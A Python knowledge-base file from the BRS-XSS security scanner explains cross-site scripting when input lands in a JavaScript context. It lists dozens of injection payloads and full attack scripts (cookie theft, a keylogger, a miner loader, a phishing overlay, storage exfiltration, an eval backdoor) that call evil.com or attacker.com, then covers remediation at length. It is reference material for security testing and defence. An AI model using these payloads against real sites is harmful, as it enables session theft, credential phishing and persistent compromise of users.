#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Modified
Telegram: https://t.me/easyprotech

Knowledge Base: JavaScript Context - Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in JavaScript Context",
    
    "description": """
User input is placed directly into a JavaScript block, outside of a string literal. This is one of the 
most CRITICAL XSS contexts because it allows direct code injection without needing to break out of strings 
or attributes. The attacker can inject arbitrary JavaScript statements that execute with full page privileges.

VULNERABILITY CONTEXT:
This occurs when server-side code embeds user data directly into JavaScript:
- <script>var user = USER_INPUT;</script>
- <script>doSomething(USER_INPUT);</script>
- <script>var config = {key: USER_INPUT};</script>
- JSONP callbacks with unvalidated names
- Dynamic script generation
- eval() with user-controllable input
- Function() constructor with user data
- setTimeout/setInterval with string arguments
- Server-side template engines embedding variables in <script> tags

Common in:
- Server-side rendering (SSR) frameworks
- Legacy PHP/ASP/JSP applications
- Analytics and tracking code
- Configuration objects
- JSONP APIs
- Dynamic module loaders

SEVERITY: CRITICAL
Direct JavaScript injection is the most dangerous XSS vector - no encoding bypasses needed.
Immediate arbitrary code execution with no user interaction required.
""",

    "attack_vector": """
DIRECT CODE INJECTION:

1. BASIC INJECTION:
   Server code:
   <script>
   var data = <?php echo $user_input ?>;
   </script>
   
   Payload:
   1; alert(document.cookie); var x = 1
   
   Result:
   <script>
   var data = 1; alert(document.cookie); var x = 1;
   </script>

2. VARIABLE ASSIGNMENT:
   <script>var userId = USER_INPUT;</script>
   
   Payloads:
   null; alert(1); var x=
   123; fetch('//evil.com?c='+document.cookie); var x=
   null}catch(e){alert(1)}try{var x=

3. FUNCTION ARGUMENTS:
   <script>doSomething(USER_INPUT);</script>
   
   Payloads:
   1); alert(1); doSomething(1
   null); fetch('//evil.com?c='+btoa(document.cookie)); doSomething(null
   1, alert(1), 1

4. OBJECT PROPERTIES:
   <script>var config = {value: USER_INPUT};</script>
   
   Payloads:
   1, exploit: alert(1), real: 1
   null}; alert(1); var config = {value: null
   1}};alert(1);var config = {value:1

ES6 TEMPLATE LITERAL EXPLOITATION:

5. TEMPLATE STRINGS:
   <script>var message = `Hello USER_INPUT`;</script>
   
   Payload:
   ${alert(1)}
   ${fetch('//evil.com?c='+document.cookie)}
   ${constructor.constructor('alert(1)')()}
   
   Result:
   <script>var message = `Hello ${alert(1)}`;</script>

6. TAGGED TEMPLATES:
   <script>sql`SELECT * FROM users WHERE id = ${USER_INPUT}`;</script>
   
   Payload:
   1}; alert(1); var x = ${1
   1} OR 1=1 --

7. NESTED TEMPLATES:
   <script>var x = `Outer ${`Inner ${USER_INPUT}`}`;</script>
   
   Payload:
   ${alert(1)}
   `+alert(1)+`

PROTOTYPE POLLUTION:

8. __PROTO__ INJECTION:
   <script>var config = {USER_KEY: USER_VALUE};</script>
   
   If USER_KEY can be controlled:
   __proto__: {polluted: true}
   constructor: {prototype: {polluted: true}}
   
   Leading to XSS via:
   Object.prototype.polluted = '<img src=x onerror=alert(1)>';

9. CONSTRUCTOR POLLUTION:
   <script>merge(defaultConfig, {USER_INPUT});</script>
   
   Payload:
   "constructor": {"prototype": {"isAdmin": true}}

ARRAY/OBJECT CONTEXT BREAKOUTS:

10. ARRAY INJECTION:
    <script>var items = [USER_INPUT];</script>
    
    Payloads:
    1]; alert(1); var items = [1
    null]; fetch('//evil.com'); var x = [null
    1, alert(1), 1

11. NESTED OBJECTS:
    <script>var data = {user: {name: USER_INPUT}};</script>
    
    Payloads:
    null}}, exploit: alert(1), nested: {name: null
    "test"}}; alert(1); var data = {user: {name: "test"

12. BREAKING OUT WITH PUNCTUATION:
    }, alert(1), {x:1
    }], alert(1), [{x:1
    })}, alert(1), {x:({

FUNCTION CONSTRUCTOR ABUSE:

13. eval() INJECTION:
    <script>eval('var x = ' + USER_INPUT);</script>
    
    Payload:
    1; alert(1); var y=1
    
    Direct execution - extremely dangerous

14. Function() CONSTRUCTOR:
    <script>var fn = new Function('return ' + USER_INPUT);</script>
    
    Payload:
    1; alert(1); return 1
    alert(1)

15. setTimeout/setInterval STRINGS:
    <script>setTimeout('doSomething(' + USER_INPUT + ')', 1000);</script>
    
    Payload:
    1); alert(1); doSomething(1

ASYNC/AWAIT AND PROMISES:

16. PROMISE CHAINS:
    <script>
    Promise.resolve(USER_INPUT).then(data => console.log(data));
    </script>
    
    Payload:
    null); alert(1); Promise.resolve(null

17. ASYNC FUNCTIONS:
    <script>
    async function process() {
        var result = USER_INPUT;
    }
    </script>
    
    Payload:
    await fetch('//evil.com?c='+document.cookie); var result = null

18. GENERATORS:
    <script>
    function* gen() {
        yield USER_INPUT;
    }
    </script>
    
    Payload:
    alert(1); yield null

ENCODING AND OBFUSCATION BYPASSES:

19. UNICODE ESCAPES:
    <script>var x = \\u0055SER_INPUT;</script>
    
    Payloads:
    \\u0061lert(1)
    \\u0065val(atob('YWxlcnQoMSk='))
    
    Bypass:
    var x = \\u0061lert; x(1);

20. HEX ESCAPES:
    Payload:
    \\x61lert(1)
    \\x65\\x76\\x61\\x6c('alert(1)')

21. OCTAL ESCAPES:
    Payload:
    \\141lert(1)

22. COMMENT TRICKS:
    Payload:
    /**/alert(1)/**/
    1/*comment*/;alert(1);/**/var x=1
    1;alert(1)//rest of line ignored
    1;alert(1)<!--HTML comment also works in JS
    1;alert(1)-->

JSONP EXPLOITATION:

23. CALLBACK MANIPULATION:
    Server: /api/data?callback=USER_INPUT
    Response: USER_INPUT({"data":"value"})
    
    Payloads:
    alert
    alert(1);foo
    alert(1)//
    eval
    Function('alert(1)')()//
    
    Result:
    <script src="/api/data?callback=alert"></script>
    Executes: alert({"data":"value"})

24. JSONP WITH VALIDATION BYPASS:
    If server validates [a-zA-Z0-9_]:
    
    Use existing functions:
    alert
    console.log
    eval
    
    With dots (if allowed):
    console.log
    document.write
    window.alert

FRAMEWORK-SPECIFIC ATTACKS:

25. ANGULAR (v1.x) TEMPLATE INJECTION IN SCRIPT:
    <script>
    var template = '{{USER_INPUT}}';
    </script>
    
    Payload:
    {{constructor.constructor('alert(1)')()}}
    {{$on.constructor('alert(1)')()}}

26. VUE SERVER-SIDE RENDERING:
    <script>
    var app = new Vue({
        data: {value: 'USER_INPUT'}
    });
    </script>
    
    If USER_INPUT reaches template:
    {{constructor.constructor('alert(1)')()}}

27. REACT SSR ESCAPING BYPASS:
    Normally React escapes, but in <script>:
    <script>
    window.__INITIAL_STATE__ = USER_INPUT;
    </script>
    
    If not properly serialized:
    </script><script>alert(1)</script><script>

EXPLOITATION TECHNIQUES:

28. SCRIPT GADGETS:
    Using existing page scripts for exploitation:
    
    If page has:
    <script>
    function loadModule(name) {
        var script = document.createElement('script');
        script.src = '/modules/' + name + '.js';
        document.body.appendChild(script);
    }
    </script>
    
    Inject:
    null; loadModule('../../evil.com/xss'); var x=null

29. BREAKING OUT OF FUNCTIONS:
    <script>
    function process() {
        var data = USER_INPUT;
        return data;
    }
    </script>
    
    Payloads:
    null; } alert(1); function process() { var data=null
    null}};alert(1);process=function(){return null

30. MODULE IMPORTS:
    <script type="module">
    import {func} from 'USER_INPUT';
    </script>
    
    Payload:
    data:text/javascript,alert(1)//

REAL-WORLD ATTACK SCENARIOS:

SESSION HIJACKING:
<script>
var userId = null; 
fetch('//attacker.com/steal?c=' + btoa(document.cookie));
var x = null;
</script>

KEYLOGGER:
<script>
var data = null;
document.addEventListener('keypress', e => {
    fetch('//attacker.com/log?k=' + e.key);
});
var x = null;
</script>

CRYPTOCURRENCY MINING:
<script>
var config = null;
var script = document.createElement('script');
script.src = '//attacker.com/coinhive.min.js';
document.head.appendChild(script);
setTimeout(() => {
    new CoinHive.Anonymous('attacker-key').start();
}, 1000);
var x = null;
</script>

PHISHING PAGE INJECTION:
<script>
var user = null;
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999"><form action="//evil.com/phish" method="POST"><h2>Session Expired</h2><input name="user" placeholder="Username" required><input name="pass" type="password" placeholder="Password" required><button>Login</button></form></div>';
var x = null;
</script>

DATA EXFILTRATION:
<script>
var apiKey = null;
var sensitiveData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    location: window.location.href,
    referrer: document.referrer
};
fetch('//attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(sensitiveData)
});
var x = null;
</script>

PERSISTENT BACKDOOR:
<script>
var temp = null;
setInterval(() => {
    fetch('//attacker.com/cmd')
        .then(r => r.text())
        .then(cmd => eval(cmd));
}, 5000);
var x = null;
</script>
""",

    "remediation": """
DEFENSE-IN-DEPTH STRATEGY:

1. NEVER PLACE UNTRUSTED INPUT IN JAVASCRIPT CONTEXT:
   
   This is the PRIMARY rule. Violation leads to immediate RCE.
   
   BAD (Never do this):
   <script>
   var userId = <?php echo $user_id ?>;
   var username = <?php echo $username ?>;
   var config = {value: <?= $user_data ?>};
   </script>

2. USE DATA ATTRIBUTES (Recommended Approach):
   
   HTML (Server-side):
   <div id="app-data" 
        data-user-id="<?php echo htmlspecialchars($user_id) ?>"
        data-username="<?php echo htmlspecialchars($username) ?>">
   </div>
   
   JavaScript (Client-side):
   <script>
   const appData = document.getElementById('app-data');
   const userId = appData.dataset.userId; // Safe!
   const username = appData.dataset.username; // Safe!
   </script>

3. JSON SERIALIZATION WITH PROPER ESCAPING:
   
   Python (Flask/Django):
   import json
   <script>
   var config = {{ config_data|tojson|safe }};
   </script>
   
   Or better:
   <script>
   var config = JSON.parse('{{ config_data|tojson }}');
   </script>
   
   PHP:
   <script>
   var config = <?php echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
   </script>
   
   Node.js:
   const serialize = require('serialize-javascript');
   <script>
   var config = <%= serialize(data) %>;
   </script>

4. USE SCRIPT TYPE='APPLICATION/JSON':
   
   HTML:
   <script type="application/json" id="app-config">
   <?php echo json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP); ?>
   </script>
   
   <script>
   // Parse safely
   const configElement = document.getElementById('app-config');
   const config = JSON.parse(configElement.textContent);
   </script>
   
   This prevents execution even if malicious content is injected.

5. CONTENT SECURITY POLICY (CSP):
   
   Strict CSP (Blocks inline scripts):
   Content-Security-Policy: 
     default-src 'self';
     script-src 'self' 'nonce-RANDOM123';
     object-src 'none';
   
   HTML:
   <script nonce="RANDOM123">
   // Only scripts with matching nonce execute
   var config = getConfigSafely();
   </script>
   
   With strict-dynamic (Better):
   Content-Security-Policy:
     script-src 'nonce-RANDOM123' 'strict-dynamic';
   
   Blocks eval() and Function():
   Content-Security-Policy:
     script-src 'self' 'unsafe-inline'; // Without 'unsafe-eval'

6. TRUSTED TYPES API (Modern Browsers):
   
   Policy:
   Content-Security-Policy: require-trusted-types-for 'script'
   
   JavaScript:
   if (window.trustedTypes && trustedTypes.createPolicy) {
       const policy = trustedTypes.createPolicy('default', {
           createScript: (input) => {
               // Validate and sanitize
               if (isSafe(input)) {
                   return input;
               }
               throw new TypeError('Unsafe script');
           }
       });
   }
   
   This prevents:
   - eval() with untrusted strings
   - Function() constructor
   - innerHTML with <script>
   - javascript: URLs

7. AVOID DANGEROUS APIS:
   
   NEVER USE WITH USER INPUT:
   - eval(userInput)
   - new Function(userInput)
   - setTimeout(userInput, 1000) // String form
   - setInterval(userInput, 1000) // String form
   - element.innerHTML = '<script>' + userInput + '</script>'
   - document.write(userInput)
   - document.writeln(userInput)
   
   USE SAFE ALTERNATIVES:
   - JSON.parse(userInput) // With try/catch
   - setTimeout(() => safeFunction(userInput), 1000) // Function form
   - element.textContent = userInput

8. JSONP VALIDATION:
   
   Strict callback validation:
   
   Python:
   import re
   
   CALLBACK_PATTERN = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$')
   
   if not CALLBACK_PATTERN.match(callback):
       return jsonify({"error": "Invalid callback"}), 400
   
   PHP:
   if (!preg_match('/^[a-zA-Z_$][a-zA-Z0-9_$]*$/', $callback)) {
       die('Invalid callback');
   }
   
   Or better: DON'T USE JSONP - use CORS instead:
   Access-Control-Allow-Origin: https://trusted-domain.com

9. SERVER-SIDE RENDERING (SSR) PROTECTION:
   
   React (Next.js):
   // Use getServerSideProps
   export async function getServerSideProps(context) {
       const data = await fetchData();
       return {
           props: {
               data: data // Automatically serialized safely
           }
       };
   }
   
   Vue (Nuxt.js):
   export default {
       async asyncData({ params }) {
           const data = await fetchData();
           return { data }; // Safely serialized
       }
   }
   
   Angular Universal:
   // Uses TransferState for safe serialization

10. INPUT VALIDATION:
    
    For numeric IDs:
    $user_id = intval($_GET['id']);
    if ($user_id <= 0) die('Invalid ID');
    
    For enums:
    $allowed = ['en', 'es', 'fr', 'de'];
    if (!in_array($lang, $allowed)) $lang = 'en';
    
    For JSON:
    try {
        $data = json_decode($input, true, 512, JSON_THROW_ON_ERROR);
    } catch (JsonException $e) {
        die('Invalid JSON');
    }

SECURITY CHECKLIST:

[ ] No user input placed directly in <script> tags
[ ] All data passed via data attributes or JSON in <script type="application/json">
[ ] JSON serialization uses proper flags (JSON_HEX_TAG, etc.)
[ ] CSP configured to block 'unsafe-eval' and inline scripts without nonces
[ ] Trusted Types API enabled (modern browsers)
[ ] No eval(), Function(), setTimeout/setInterval with strings
[ ] JSONP callbacks validated with strict regex (or JSONP avoided entirely)
[ ] SSR frameworks configured for safe serialization
[ ] All numeric inputs validated and cast to int
[ ] All enum inputs validated against whitelist
[ ] Code review for all server-side JavaScript generation
[ ] Regular security testing with focus on script injection
[ ] Developer training on JavaScript context XSS

TESTING PAYLOADS:

Basic injection:
1; alert(1); var x=1

Template literal:
${alert(1)}

Object breakout:
1, exploit: alert(1), real: 1

Array breakout:
1]; alert(1); var x=[1

Comment abuse:
1; alert(1)//
1; alert(1)/**/

JSONP:
alert
eval(atob('YWxlcnQoMSk='))

OWASP REFERENCES:
- OWASP XSS Prevention Cheat Sheet: Rule #3
- CWE-79: Improper Neutralization of Input During Web Page Generation
- Content Security Policy Level 3
- Trusted Types API Specification
- OWASP Testing Guide: Testing for JavaScript Execution
"""
}
